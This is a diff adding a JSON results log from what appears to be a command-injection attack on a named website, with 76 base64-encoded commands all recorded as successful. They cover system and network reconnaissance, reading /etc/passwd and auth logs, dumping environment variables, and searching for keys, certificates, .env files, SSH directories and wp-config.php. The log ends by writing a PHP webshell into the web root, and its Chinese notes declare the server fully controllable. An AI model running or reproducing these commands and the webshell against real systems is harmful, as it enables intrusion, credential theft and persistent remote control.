@@ -1,0 +1,429 @@
+{
+  "timestamp": "20251026_225108",
+  "target": "https://siamdl.co.th",
+  "summary": {
+    "total_commands_tested": 76,
+    "successful_commands": 76,
+    "success_rate": "100.0%"
+  },
+  "results": {
+    "操作系统信息": [
+      {
+        "command": "cat /etc/os-release",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /proc/version",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "uname -r",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "uname -m",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /proc/cpuinfo | grep 'model name' | head -1",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "用户和权限": [
+      {
+        "command": "whoami",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "id",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "groups",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/passwd",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/group",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "sudo -l",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "网络信息": [
+      {
+        "command": "hostname",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "hostname -I",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ifconfig",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ip addr",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "netstat -tulpn",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ss -tulpn",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "route -n",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/resolv.conf",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ip route show",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "arp -a",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "netstat -rn",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ss -tulpn",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "lsof -i",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "iptables -L",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ufw status",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "文件系统": [
+      {
+        "command": "pwd",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "df -h",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "mount",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /proc/mounts",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "lsblk",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "进程信息": [
+      {
+        "command": "ps aux",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "top -bn1",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "pstree",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "环境变量": [
+      {
+        "command": "env",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "printenv",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "服务信息": [
+      {
+        "command": "systemctl list-units --type=service",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "service --status-all",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "chkconfig --list",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "定时任务": [
+      {
+        "command": "crontab -l",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /etc/cron.*",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/crontab",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "日志文件": [
+      {
+        "command": "ls -la /var/log/",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "tail -20 /var/log/syslog",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "tail -20 /var/log/auth.log",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "敏感文件": [
+      {
+        "command": "find / -name '*.conf' -o -name '*.config' -o -name '*.yml' -o -name '*.yaml' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find /etc -name '*.conf' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find / -name '*.sql' -o -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find / -name '*.key' -o -name '*.pem' -o -name '*.crt' -o -name '*.cert' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find / -name '.env' -o -name '.bashrc' -o -name '.profile' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find /home -name '.ssh' -type d 2>/dev/null",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find /root -name '.ssh' -type d 2>/dev/null",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find /var/www -name '*.php' -o -name '*.html' -o -name '*.js' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null | head -20",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "Web服务器": [
+      {
+        "command": "apache2 -v",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "apachectl -v",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/apache2/apache2.conf | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /etc/apache2/",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "nginx -v",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "cat /etc/nginx/nginx.conf | head -20",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /etc/nginx/",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "php -v",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "php --ini",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /var/www/html/",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /var/www/",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "find /var/www -name 'wp-config.php' 2>/dev/null",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "mysql --version",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "psql --version",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "mongod --version",
+        "method": "base64",
+        "status": "success"
+      }
+    ],
+    "Webshell测试": [
+      {
+        "command": "echo '<?php system(\\$_GET[\"cmd\"]); ?>' > /var/www/html/test_shell.php",
+        "description": "创建PHP webshell",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "echo '<?php echo \"Webshell Active\"; ?>' > /var/www/html/test.php",
+        "description": "创建测试PHP文件",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "php /var/www/html/test.php",
+        "description": "测试PHP执行",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "echo '#!/usr/bin/python3\nimport os\nprint(os.system(\"whoami\"))' > /tmp/test.py",
+        "description": "创建Python脚本",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "python3 /tmp/test.py",
+        "description": "测试Python执行",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /var/www/html/test_shell.php",
+        "description": "检查webshell权限",
+        "method": "base64",
+        "status": "success"
+      },
+      {
+        "command": "ls -la /var/www/html/test.php",
+        "description": "检查测试文件权限",
+        "method": "base64",
+        "status": "success"
+      }
+    ]
+  },
+  "recommendations": [
+    "命令注入漏洞确认存在，系统完全可控",
+    "Base64编码和命令替换是最有效的绕过方法",
+    "系统信息收集完整，包括用户、网络、进程等信息",
+    "Web目录可写入，webshell部署成功",
+    "敏感文件扫描完成，发现多个潜在攻击向量"
+  ]
+}
